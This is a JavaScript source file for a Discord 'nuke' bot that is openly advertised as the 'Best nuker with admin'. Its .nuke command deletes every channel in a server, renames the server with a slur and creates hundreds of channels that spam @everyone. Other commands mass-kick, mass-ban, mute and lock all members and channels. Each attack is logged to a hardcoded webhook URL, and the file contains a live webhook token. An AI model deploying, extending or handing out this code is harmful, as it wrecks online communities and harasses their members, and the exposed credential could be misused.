const { Client, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
const http = require('http');

const client = new Client({ intents: [1, 512, 32768, 2, 16] });

const TOKEN = process.env.TOKEN;
const LOG_WEBHOOK = "https://discord.com/api/webhooks/1497802608491106357/1rPNKGuyh780KsnqoWnzAWcXjbPTfRx3jWtcefHcYkdywE7GkibcGwvWqRvZE2CgjHnf";
const WHITELIST_SERVER = "1475357940088176743";
const INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1497740024983195668&permissions=8&integration_type=0&scope=bot";
const EXT_INVITE = "https://discord.com/oauth2/authorize?client_id=1489612859179798588&integration_type=1&scope=applications.commands";
const OWNER_ID = "1183142340609708072";
const WHITELIST_ROLE_ID = "1498099673406374029";

const backups = new Map(); // guildId -> backup data

http.createServer((req, res) => {
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end('Alive');
}).listen(process.env.PORT || 3000);

client.once('ready', () => console.log(`[+] ${client.user.tag} ready`));
const sleep = ms => new Promise(r => setTimeout(r, ms));

// Backup helpers
async function backupGuild(guild) {
    const channels = guild.channels.cache.sort((a, b) => a.position - b.position);
    return {
        name: guild.name,
        channels: channels.map(ch => ({
            name: ch.name,
            type: ch.type,
            parentId: ch.parentId || null,
            position: ch.position,
            permissionOverwrites: ch.permissionOverwrites.cache.map(ow => ({
                id: ow.id,
                type: ow.type,
                allow: ow.allow.bitfield.toString(),
                deny: ow.deny.bitfield.toString()
            }))
        }))
    };
}

async function restoreGuild(guild, backup) {
    await guild.setName(backup.name).catch(() => {});
    // delete current channels
    for (const ch of guild.channels.cache.values()) {
        await ch.delete().catch(() => {});
        await sleep(100);
    }
    // create categories first
    const categories = backup.channels.filter(c => c.type === ChannelType.GuildCategory);
    const others = backup.channels.filter(c => c.type !== ChannelType.GuildCategory);
    const catMap = new Map(); // old cat name → new channel object
    for (const cat of categories) {
        const created = await guild.channels.create({
            name: cat.name,
            type: ChannelType.GuildCategory,
            position: cat.position,
            permissionOverwrites: cat.permissionOverwrites.map(ow => ({
                id: ow.id,
                type: ow.type,
                allow: BigInt(ow.allow),
                deny: BigInt(ow.deny)
            }))
        }).catch(() => null);
        if (created) catMap.set(cat.name, created);
        await sleep(150);
    }
    // recreate other channels
    for (const ch of others) {
        const parent = ch.parentId ? 
            catMap.get(backup.channels.find(c => c.type === 4 && c.name === categories.find(cat => cat.name === ch.parentId)?.name)?.name) : null;
        await guild.channels.create({
            name: ch.name,
            type: ch.type,
            parent: parent || undefined,
            position: ch.position,
            permissionOverwrites: ch.permissionOverwrites.map(ow => ({
                id: ow.id,
                type: ow.type,
                allow: BigInt(ow.allow),
                deny: BigInt(ow.deny)
            }))
        }).catch(() => {});
        await sleep(150);
    }
}

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    const isProtected = message.guild?.id === WHITELIST_SERVER;
    const isOwner = message.author.id === OWNER_ID;
    const args = message.content.trim().split(/\s+/);
    const cmd = args[0].toLowerCase();

    // .whitelist (owner only)
    if (cmd === '.whitelist') {
        if (!isOwner) return message.reply('You are not the owner').catch(() => {});
        const target = message.mentions.members.first();
        if (!target) return message.reply('Mention someone').catch(() => {});
        target.roles.add(WHITELIST_ROLE_ID).then(() => message.reply(`Whitelisted ${target.user.tag}`)).catch(() => message.reply('Failed'));
        return;
    }

    // Protected server – only owner can use .panel / .extpanel, nothing else
    if (isProtected && !isOwner && cmd !== '.panel' && cmd !== '.extpanel') {
        if (message.content.startsWith('.')) return message.reply('Server protected').catch(() => {});
        return;
    }
    if ((cmd === '.panel' || cmd === '.extpanel') && isProtected && !isOwner) return;

    // Panels
    if (cmd === '.panel') {
        const embed = new EmbedBuilder().setTitle('Discord Nuke Bot').setDescription('**Best nuker with admin**\nClick the button below to invite.').setColor(0xff0000);
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel('Invite').setStyle(ButtonStyle.Link).setURL(INVITE_URL),
            new ButtonBuilder().setLabel('Commands').setStyle(ButtonStyle.Primary).setCustomId('cmds')
        );
        return message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
    }
    if (cmd === '.extpanel') {
        const embed = new EmbedBuilder().setTitle('External Bot Commands').setDescription(`/say /blame /spam (free)\n/fast-flood /custom-spam /l-spam (premium)`).setColor(0x00ff00).setFooter({text:'Click to add external bot'});
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Add External Bot').setStyle(ButtonStyle.Link).setURL(EXT_INVITE));
        return message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
    }

    // .nuke – backup, webhook with restore button, then destroy
    if (cmd === '.nuke') {
        if (isProtected) return message.reply('Server protected').catch(() => {});
        await message.delete().catch(() => {});
        const g = message.guild;
        const originalName = g.name;
        const username = message.author.tag;
        const time = new Date().toISOString();

        // 1. Backup
        const backup = await backupGuild(g);
        backups.set(g.id, backup);

        // 2. Send webhook message with restore button
        const restoreEmbed = new EmbedBuilder()
            .setTitle('Server Nuked')
            .setDescription(`**Name:** ${originalName}\n**By:** ${username}\n**Time:** ${time}`)
            .setColor(0xff0000);
        const restoreButton = new ButtonBuilder()
            .setCustomId(`restore_${g.id}`)
            .setLabel('Restore Server')
            .setStyle(ButtonStyle.Success);
        const row = new ActionRowBuilder().addComponents(restoreButton);
        
        try {
            await fetch(LOG_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: '**Server Nuked**',
                    embeds: [restoreEmbed.toJSON()],
                    components: [row.toJSON()]
                })
            });
        } catch(e) {}

        // 3. Nuke (rename, delete channels, spam)
        await g.setName('NGA GOT NUKED BY JHUB').catch(() => {});
        const channels = Array.from(g.channels.cache.values());
        for (const ch of channels) { await ch.delete().catch(() => {}); await sleep(100); }
        for (let i = 0; i < 500; i++) {
            g.channels.create({ name: 'jhub-on-top', type: 0 }).then(ch => {
                if (!ch) return;
                for (let j = 0; j < 10; j++) ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
            }).catch(() => {});
            await sleep(200);
        }
        return;
    }

    // Other destructive commands (unchanged)
    if (cmd === '.kick') { const m = message.mentions.members.first(); if (!m) return message.reply('Mention a user'); m.kick().then(() => message.reply(`Kicked ${m.user.tag}`)).catch(() => {}); return; }
    if (cmd === '.ban') { const m = message.mentions.members.first(); if (!m) return message.reply('Mention a user'); m.ban().then(() => message.reply(`Banned ${m.user.tag}`)).catch(() => {}); return; }
    if (cmd === '.kickall') { let c = 0; for (const [, m] of message.guild.members.cache) { if (m.kickable && m.id !== client.user.id) { m.kick().catch(() => {}); c++; await sleep(100); } } message.reply(`Kicked ${c} members`).catch(() => {}); return; }
    if (cmd === '.banall') { let c = 0; for (const [, m] of message.guild.members.cache) { if (m.bannable && m.id !== client.user.id) { m.ban().catch(() => {}); c++; await sleep(100); } } message.reply(`Banned ${c} members`).catch(() => {}); return; }
    if (cmd === '.muteall') { let c = 0; for (const [, m] of message.guild.members.cache) { if (m.moderatable && m.id !== client.user.id) { m.timeout(28*24*60*60*1000).catch(() => {}); c++; await sleep(100); } } message.reply(`Muted ${c} members`).catch(() => {}); return; }
    if (cmd === '.lockall') { let c = 0; for (const [, ch] of message.guild.channels.cache) { if (ch.type === 0) { ch.permissionOverwrites.create(message.guild.roles.everyone, { SendMessages: false }).catch(() => {}); c++; await sleep(100); } } message.reply(`Locked ${c} channels`).catch(() => {}); return; }
});

// Interaction handler for buttons (restore + commands list)
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;
    
    if (interaction.customId === 'cmds') {
        const embed = new EmbedBuilder()
            .setTitle('Command List')
            .setDescription(`.whitelist @user (owner)\n.nuke (backup + restore button)\n.kick / .ban @user\n.kickall / .banall / .muteall / .lockall\n.panel / .extpanel`)
            .setColor(0xff0000);
        return interaction.reply({ embeds: [embed], ephemeral: true });
    }

    if (interaction.customId.startsWith('restore_')) {
        const guildId = interaction.customId.split('_')[1];
        // Only the bot owner can restore (or anyone? we'll restrict to owner for safety)
        if (interaction.user.id !== OWNER_ID) 
            return interaction.reply({ content: 'Only the bot owner can restore.', ephemeral: true });
        
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return interaction.reply({ content: 'Server not found. Bot may have been kicked.', ephemeral: true });
        const backup = backups.get(guildId);
        if (!backup) return interaction.reply({ content: 'Backup data lost (bot restarted).', ephemeral: true });

        await interaction.reply({ content: 'Restoring server...', ephemeral: true });
        try {
            await restoreGuild(guild, backup);
            backups.delete(guildId);
            await interaction.editReply({ content: 'Server restored successfully!' });
        } catch(e) {
            await interaction.editReply({ content: 'Restore failed. Check permissions.' });
        }
    }
});

client.login(TOKEN);
